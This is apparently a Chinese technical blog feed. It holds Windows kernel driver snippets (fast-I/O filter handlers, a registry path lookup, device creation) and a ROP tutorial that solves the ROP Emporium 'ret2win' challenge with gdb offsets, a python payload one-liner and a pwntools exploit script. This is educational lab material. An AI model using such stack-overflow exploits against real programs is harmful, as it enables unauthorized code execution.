class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN <span class="title">FastIoQueryOpen</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PIRP Irp,</span></span></span><br><span class="line"><span class="params"><span class="function">    PFILE_NETWORK_OPEN_INFORMATION NetworkInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT DeviceObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIO_STACK_LOCATION IoStackLocation = <span class="built_in">IoGetCurrentIrpStackLocation</span>(Irp);</span><br><span class="line"></span><br><span class="line">    <span class="function">BEGIN_FAST_IO</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(FastIoDispatch-&gt;FastIoQueryOpen == <span class="literal">NULL</span>)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">goto</span> Exit</span>;</span><br><span class="line"></span><br><span class="line">    IoStackLocation-&gt;DeviceObject = v2;</span><br><span class="line">    IsOk = FastIoDispatch-&gt;<span class="built_in">FastIoQueryOpen</span>(</span><br><span class="line">        Irp,</span><br><span class="line">        NetworkInformation,</span><br><span class="line">        v2);</span><br><span class="line">    IoStackLocation-&gt;DeviceObject = DeviceObject;</span><br><span class="line"></span><br><span class="line">    END_FAST_IO</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">FastIoDetachDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT SourceDevice,</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT TargetDevice)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">IoDetachDevice</span>(TargetDevice);</span><br><span class="line">    <span class="built_in">IoDeleteDevice</span>(SourceDevice);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从注册表获取驱动程序路径</title>
      <link href="/2024/03/09/%E4%BB%8E%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%8E%B7%E5%8F%96%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E8%B7%AF%E5%BE%84/"/>
      <url>/2024/03/09/%E4%BB%8E%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%8E%B7%E5%8F%96%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<h1 id="从注册表获取驱动程序路径"><a href="#从注册表获取驱动程序路径" class="headerlink" title="从注册表获取驱动程序路径"></a>从注册表获取驱动程序路径</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOLEAN <span class="title">LoadWorkPath</span><span class="params">()</span>   </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//驱动是由服务加载  KMD.exe</span></span><br><span class="line">    NTSTATUS Status;</span><br><span class="line"></span><br><span class="line">    OBJECT_ATTRIBUTES ObjectAttributes;</span><br><span class="line">    HANDLE KeyHandle;</span><br><span class="line">    KEY_VALUE_PARTIAL_INFORMATION* v5 = <span class="literal">NULL</span>;</span><br><span class="line">    ULONG v7, ResultLength;</span><br><span class="line">    UNICODE_STRING RegPath;</span><br><span class="line">    UNICODE_STRING ValueName;</span><br><span class="line">    UNICODE_STRING v10 = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line">    BOOLEAN IsOk = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExAcquireFastMutex</span>(&amp;__WorkPathLock);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FreeWorkPath</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;RegPath, REG_DRIVER_PATH);</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;ValueName, REG_IMAGE_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;ObjectAttributes, &amp;RegPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    Status = <span class="built_in">ZwOpenKey</span>(&amp;KeyHandle, KEY_ALL_ACCESS, &amp;ObjectAttributes);</span><br><span class="line">    <span class="keyword">if</span> (Status != STATUS_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExReleaseFastMutex</span>(&amp;__WorkPathLock);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Status = <span class="built_in">ZwQueryValueKey</span>(KeyHandle, &amp;ValueName, KeyValuePartialInformation, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;ResultLength);   <span class="comment">//获得内存大小</span></span><br><span class="line">    <span class="keyword">if</span> (Status != STATUS_BUFFER_TOO_SMALL &amp;&amp; Status != STATUS_BUFFER_OVERFLOW)</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line"></span><br><span class="line">    v7 = <span class="built_in">sizeof</span>(KEY_VALUE_PARTIAL_INFORMATION) + ResultLength;   <span class="comment">//真正需要的内存大小</span></span><br><span class="line">    v5 = (KEY_VALUE_PARTIAL_INFORMATION*)<span class="built_in">AllocateBuffer</span>(v7);</span><br><span class="line">    <span class="keyword">if</span> (v5 == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//再次枚举数据</span></span><br><span class="line">    Status = <span class="built_in">ZwQueryValueKey</span>(KeyHandle, &amp;ValueName, KeyValuePartialInformation, v5, v7, &amp;ResultLength);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status) == FALSE)</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line"></span><br><span class="line">    v10.Buffer = (WCHAR*)<span class="built_in">AllocateBuffer</span>(v5-&gt;DataLength + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (v10.Buffer == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//RtlZeroMemory(sTempWorkPath.Buffer, pKeyInfo-&gt;DataLength + 2);</span></span><br><span class="line">    <span class="built_in">memcpy</span>(v10.Buffer, v5-&gt;Data, v5-&gt;DataLength);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    kd&gt; db 0xfffffa80`61eef330</span></span><br><span class="line"><span class="comment">fffffa80`61eef330  5c 00 3f 00 3f 00 5c 00-43 00 3a 00 5c 00 39 00  \.?.?.\.C.:.\.9.</span></span><br><span class="line"><span class="comment">fffffa80`61eef340  31 00 31 00 6b 00 69 00-73 00 6b 00 6e 00 6c 00  1.1.k.i.s.k.n.l.</span></span><br><span class="line"><span class="comment">fffffa80`61eef350  36 00 34 00 5c 00 39 00-31 00 31 00 6b 00 69 00  6.4.\.9.1.1.k.i.</span></span><br><span class="line"><span class="comment">fffffa80`61eef360  73 00 6b 00 6e 00 6c 00-36 00 34 00 2e 00 73 00  s.k.n.l.6.4...s.</span></span><br><span class="line"><span class="comment">fffffa80`61eef370  79 00 73 00 00 00 00 00-01 f3 ee 61 80 fa ff ff  y.s..</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;__WorkPath, v10.Buffer);  <span class="comment">//__WorkPath 需要进行内存释放</span></span><br><span class="line">    IsOk = TRUE;</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line">    <span class="built_in">ZwClose</span>(KeyHandle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v5 != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">FreeBuffer</span>(v5);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IsOk == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (v10.Buffer != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">FreeBuffer</span>(v10.Buffer);</span><br><span class="line"></span><br><span class="line">        __WorkPath.Buffer = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExReleaseFastMutex</span>(&amp;__WorkPathLock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> IsOk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>创建控制设备对象与Ring3交互</title>
      <link href="/2024/03/01/%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E8%AE%BE%E5%A4%87%E5%AF%B9%E8%B1%A1%E4%B8%8ERing3%E4%BA%A4%E4%BA%92/"/>
      <url>/2024/03/01/%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E8%AE%BE%E5%A4%87%E5%AF%B9%E8%B1%A1%E4%B8%8ERing3%E4%BA%A4%E4%BA%92/</url>
      
        <content type="html"><![CDATA[<h1 id="创建一个控制设备对象"><a href="#创建一个控制设备对象" class="headerlink" title="创建一个控制设备对象"></a>创建一个控制设备对象</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个控制设备对象 (Ring3.exe交互)</span></span><br><span class="line"><span class="function">DEVICE_OBJECT* <span class="title">CreateDevice</span><span class="params">(WCHAR* DeviceName,</span></span></span><br><span class="line"><span class="params"><span class="function">    WCHAR* LinkName,</span></span></span><br><span class="line"><span class="params"><span class="function">    DRIVER_OBJECT* DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOLEAN IsDeviceExclusive)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    UNICODE_STRING v1;</span><br><span class="line">    UNICODE_STRING v2;</span><br><span class="line">    DEVICE_OBJECT* DeviceObject = <span class="literal">NULL</span>;   <span class="comment">//一维指针</span></span><br><span class="line">    PDEVICE_EXTENSION DeviceExtension;    <span class="comment">//设备扩展的指针  ????????????</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;v1, DeviceName);</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;v2, LinkName);</span><br><span class="line"></span><br><span class="line">    Status = <span class="built_in">IoCreateDevice</span>(</span><br><span class="line">        DriverObject,</span><br><span class="line">        <span class="built_in">sizeof</span>(DEVICE_EXTENSION),</span><br><span class="line">        &amp;v1,</span><br><span class="line">        FILE_DEVICE_UNKNOWN,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        IsDeviceExclusive,</span><br><span class="line">        &amp;DeviceObject);   <span class="comment">//二维指针</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status) == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设备扩展自定义的设备对象的私有数据</span></span><br><span class="line">    DeviceExtension = (PDEVICE_EXTENSION)DeviceObject-&gt;DeviceExtension;  <span class="comment">//系统分配出来的设备扩展</span></span><br><span class="line">    DeviceExtension-&gt;chDriver = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    DeviceExtension-&gt;pFSDeviceObject = <span class="literal">NULL</span>;   <span class="comment">//不需要挂载到设备栈</span></span><br><span class="line">    DeviceExtension-&gt;DeviceType = MAIN_CTRL;</span><br><span class="line"></span><br><span class="line">    DeviceObject-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"></span><br><span class="line">    Status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;v2, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status) == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">IoDeleteDevice</span>(DeviceObject);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> DeviceObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ROP技术实战</title>
      <link href="/2024/03/01/ROP%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98/"/>
      <url>/2024/03/01/ROP%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="ROP实战"><a href="#ROP实战" class="headerlink" title="ROP实战"></a>ROP实战</h1><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）</p><p>ROP是一种攻击技术，其中攻击者使用堆栈的控制来在现有程序代码中的子程序中的返回指令之前，立即间接地执行精心挑选的指令或机器指令组。</p><h1 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）</p><p>   ROP是一种攻击技术，其中攻击者使用堆栈的控制来在现有程序代码中的子程序中的返回指令之前，立即间接地执行精心挑选的指令或机器指令组。</p><p>   因为所有执行的指令来自原始程序内的可执行存储器区域，所以这避免了直接代码注入的麻烦，并绕过了用来阻止来自用户控制的存储器的指令的执行的大多数安全措施。</p><p>   因此，ROP技术是可以用来绕过现有的程序内部内存的保护机制的。</p><p>   ROP要完成的任务包括要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。有时目标函数在内存内无法找到，有时目标操作并没有特定的函数可以完美适配，此时就需要在内存中寻找多个指令片段，拼凑出一系列操作来达成目的。假如要执行某段指令（我们将其称为“gadget”，意为小工具），溢出数据应该以下面的方式构造：</p><p>payload : padding + address of gadget</p><p><img src="/.io//image-20240209220652069.png" alt="image-20240209220652069"></p><p>上图是包括单个gadget的溢出</p><p>   如果想连续执行若干段指令，就需要每个 gadget 执行完毕可以将控制权交给下一个 gadget。所以 gadget 的最后一步应该是 RET 指令，这样程序的控制权（eip）才能得到切换，所以这种技术被称为返回导向编程( Return OrientedProgramming )。要执行多个 gadget，溢出数据应该以下面的方式构造：</p><p>   payload : padding + address of gadget 1 +address of gadget 2 + …… + address of gadget n</p><p>   在这样的构造下，被调用函数返回时会跳转执行 gadget 1，执行完毕时 gadget 1 的 RET 指令会将此时的栈顶数据（也就是 gadget 2 的地址）弹出至 eip，程序继续跳转执行gadget 2，以此类推。</p><p><img src="/.io//image-20240209220712513.png" alt="image-20240209220712513"></p><p>上图是包含多个gadget的溢出数据</p><p>现在任务可以分解为：针对程序栈溢出所要实现的效果，找到若干段以 ret 作为结束的指令片段，按照上述的构造将它们的地址填充到溢出数据中。所以我们要解决以下几个问题。</p><p>首先，栈溢出之后要实现什么效果？</p><p>   ROP 常见的拼凑效果是实现一次系统调用，Linux系统下对应的汇编指令是int 0x80。执行这条指令时，被调用函数的编号应存入 eax，调用参数应按顺序存入ebx，ecx，edx，esi，edi 中。例如，编号125对应函数</p><p>   mprotect (void *addr, size_t len, int prot)</p><p>   可用该函数将栈的属性改为可执行，这样就可以使用 shellcode 了。假如我们想利用系统调用执行这个函数，eax、ebx、ecx、edx 应该分别为“125”、内存栈的分段地址（可以通过调试工具确定）、“0x10000”（需要修改的空间长度，也许需要更长）、“7”（RWX 权限）。</p><p>   其次，如何寻找对应的指令片段？</p><p>   有若干开源工具可以实现搜索以ret 结尾的指令片段，著名的包括ROPgadget、rp++、ropeme 等，甚至也可以用 grep 等文本匹配工具在汇编指令中搜索 ret 再进一步筛选。</p><p>   最后，如何传入系统调用的参数？</p><p>   对于上面提到的mprotect 函数，我们需要将参数传输至寄存器，所以可以用 pop 指令将栈顶数据弹入寄存器。如果在内存中能找到直接可用的数据，也可以用 mov 指令来进行传输，不过写入数据再 pop 要比先搜索再 mov 来的简单，对吧？如果要用 pop 指令来传输调用参数，就需要在溢出数据内包含这些参数，所以上面的溢出数据格式需要一点修改。对于单个 gadget，pop 所传输的数据应该在gadget 地址之后，如下图所示。</p><p><img src="/.io//image-20240210110655704.png" alt="image-20240210110655704"></p><p>上图是以gadget“pop eax; ret;”为例</p><p>   在调用 mprotect()为栈开启可执行权限之后，我们希望执行一段 shellcode，所以要将 shellcode 也加入溢出数据，并将 shellcode 的开始地址加到 int 0x80 的 gadget之后。我们可以使用 push esp 这个 gadget。</p><p><img src="/.io//image-20240210110715208.png" alt="image-20240210110715208"></p><p> 我们假设现在内存中可以找到如下几条指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pop eax; ret;  # pop stack top into eax</span><br><span class="line"></span><br><span class="line">pop ebx; ret;  # pop stack top into ebx</span><br><span class="line"></span><br><span class="line">pop ecx; ret;  # pop stack top into ecx</span><br><span class="line"></span><br><span class="line">pop edx; ret;  # pop stack top into edx</span><br><span class="line"></span><br><span class="line">int 0x80; ret;  # system call</span><br><span class="line"></span><br><span class="line">push esp; ret;  # push address of shellcode</span><br></pre></td></tr></table></figure><p>   对于所有包含 pop 指令的 gadget，在其地址之后都要添加 pop 的传输数据，同时在所有 gadget 最后包含一段 shellcode，最终溢出数据结构应该变为如下格式。</p><p>   payload : padding + address of gadget 1 +param for gadget 1 + address of gadget 2 + param for gadget 2 + …… + addressof gadget n + shellcode</p><p><img src="/.io//image-20240210110804191.png" alt="image-20240210110804191"></p><p>此处为了简单，先假定输入溢出数据不受“\x00”字符的影响，所以 payload 可以直接包含 “\x7d\x00\x00\x00”（传给 eax 的参数125）。如果希望实现更为真实的操作，可以用多个 gadget 通过运算得到上述参数。比如可以通过下面三条 gadget 来给 eax 传递参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop eax; ret;         # pop stack top 0x1111118e into eax</span><br><span class="line"></span><br><span class="line">pop ebx; ret;         # pop stack top 0x11111111 into ebx</span><br><span class="line"></span><br><span class="line">sub eax, ebx; ret;    # eax -= ebx</span><br></pre></td></tr></table></figure><p>   解决完上述问题，我们就可以拼接出溢出数据，输入至程序来为程序调用栈开启可执行权限并执行 shellcode。</p><p>   出于简单化考虑，我们假设了所有需要的 gadget 的存在。在实际搜索及拼接 gadget 时，并不会像上面一样顺利，有两个方面需要注意。</p><p>   第一，很多时候并不能一次凑齐全部的理想指令片段，这时就要通过数据地址的偏移、寄存器之间的数据传输等方法来“曲线救国”。举个例子，假设找不到下面这条 gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop ebx; ret;</span><br></pre></td></tr></table></figure><p>   但假如可以找到下面的gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, eax; ret;</span><br></pre></td></tr></table></figure><p>   我们就可以将它和</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eax; ret;</span><br></pre></td></tr></table></figure><p>   组合起来实现将数据传输给ebx 的功能。上面提到的用多个gadget 避免输入“\x00”也是一个实例应用。</p><p>   第二，要小心 gadget 是否会破坏前面各个 gadget 已经实现的部分，比如可能修改某个已经写入数值的寄存器。另外，要特别小心gadget 对 ebp 和 esp 的操作，因为它们的变化会改变返回地址的位置，进而使后续的 gadget 无法执行。</p><h2 id="ret2win-1"><a href="#ret2win-1" class="headerlink" title="ret2win"></a>ret2win</h2><p>运行程序测试一下</p><p><img src="/.io//image-20240210111530486.png" alt="image-20240210111530486"></p><p>radare2是一个开源的逆向工程和二进制分析框架，包括反汇编、分析数据、打补丁、比较数据、搜索、替换、虚拟化等等，同时具备超强的脚本加载能力，它可以运行在几乎所有主流的平台（GNU&#x2F;Linux, .Windows *BSD, iOS, OSX, Solaris…）并且支持很多的cpu架构以及文件格式。 radare2工程是由一系列的组件构成，这些组件可以在 radare2 界面或者单独被使用–比如我们将要在接下来实验中使用到的rahash2, rabin2, ragg2三个组件，所有这些组件赋予了 radare2 强大的静态以及动态分析、十六进制编辑以及溢出漏洞挖掘的能力。</p><p>使用r2进行分析，输入aaaa进行分析，然后afl列出所有函数</p><p><img src="/.io//image-20240210111643081.png" alt="image-20240210111643081"></p><p><img src="/.io//image-20240210111653843.png" alt="image-20240210111653843"></p><p>在上图中我们注意到几个关键的函数，包括main,pwnme,ret2win，我们使用pdf分别反汇编</p><p><img src="/.io//image-20240210111827222.png" alt="image-20240210111827222"></p><p><img src="/.io//image-20240210111844566.png" alt="image-20240210111844566"></p><p><img src="/.io//image-20240210111859812.png" alt="image-20240210111859812"></p><p>我们注意到在ret2win函数中会打印flag.txt，也就是我们需要实现的目的</p><p>从上图中可以看到我们需要跳转的内存地址，以便执行上面打印flag的代码，地址为0x00400811</p><p>接下来我们需要知道覆盖指令指针所需的偏移量，在64位中需要关注RIP，可以使用gdb调试得到偏移。先使用q退出</p><p>随机创建长度为200的字符串，pattern_create 200</p><p><img src="/.io//image-20240210112105484.png" alt="image-20240210112105484"></p><p>输入r并填入字符，发现程序终止，报SIGSEGV</p><p><img src="/.io//image-20240210112211720.png" alt="image-20240210112211720"></p><p><img src="/.io//image-20240210112238211.png" alt="image-20240210112238211"></p><p>接下来用pattern_search寻找偏移量</p><p>在64位程序中，我们先看RIP，发现它不包含我们前面随机生成的序列。在64位环境下，指针无法到达高地址，即不能超过0x00007fffffffffff，所以不能直接利用查看$eip的方法。但因为<code>ret</code>指令，相当于<code>pop rsp</code>，所以只要看一下<code>rsp</code>的值，就知道跳转的地址，从而知道溢出点。为了访问这些地址值，可以从 RSP 寄存器中获取它们。 可以看到，段错误时RSP的值为“AA0AAFAAb”</p><p><img src="/.io//image-20240210112404234.png" alt="image-20240210112404234"></p><p>使用pattern offset查找偏移</p><p><img src="/.io//image-20240210112447838.png" alt="image-20240210112447838"></p><p>现在我们已经知道了覆盖RIP所需的padding（40），以及要跳转的地址（0x00400811）</p><p>所需exp的关键就是”\x90”*40 +”\x11\x08\x40\x00\x00\x00\x00\x00\x00”</p><p>使用python简单地验证下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;print &quot;\x90&quot;*40 +&quot;\x11\x08\x40\x00\x00\x00\x00\x00\x00&quot;&#x27;</span> | ./ret2win</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240210113205105.png" alt="image-20240210113205105"></p><p>或者写一个python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools to work with this binary</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;ret2win&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print out the target address</span></span><br><span class="line">info(<span class="string">&quot;%#x target&quot;</span>, elf.symbols.ret2win)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Send the payload</span></span><br><span class="line">io = process(elf.path)</span><br><span class="line">ret2win = p64(elf.symbols.ret2win)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">40</span> + ret2win</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Here&#x27;s your flag:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get our flag!</span></span><br><span class="line">flag = io.recvline()</span><br><span class="line">success(flag)</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20240210112850655.png" alt="image-20240210112850655"></p><h1 id="split"><a href="#split" class="headerlink" title="split"></a>split</h1><p>先使用file、checksec等命令看一下文件的基本信息。或rabin2 -I</p><p><img src="/.io//image-20240210185043138.png" alt="image-20240210185043138"></p><p>可以看到nx enabled，即开启了NX，也就是栈不可执行</p><p>先载入r2分析</p><p>r2 -AAA .&#x2F;split</p><p><img src="/.io//image-20240210185122410.png" alt="image-20240210185122410"></p><p>使用afl列出所有函数</p><p><img src="/.io//image-20240210185146954.png" alt="image-20240210185146954"></p><p>看到了三个可能是比较重要的函数</p><p>main：开始分析的地方</p><p>pwnme,usefulfunction:提示的这么明显了</p><p>先反汇编main</p><p>pdf @ main</p><p><img src="/.io//image-20240210185237520.png" alt="image-20240210185237520"></p><p>在上图中注意到其调用了pwnme</p><p>所以我们顺着分析pwnme</p><p>同样反汇编</p><p>pdf @ sym.pwnme</p><p><img src="/.io//image-20240210185414587.png" alt="image-20240210185414587"></p><p>从上图可以看到有一个32字节的缓冲区，可以通过fgets接收96字节的输入从而溢出，也是和上一题ret2win一样溢出rip吗？</p><p>我们先使用gdb 分析，往input中写入随机100字节序列</p><p><img src="/.io//image-20240210185518036.png" 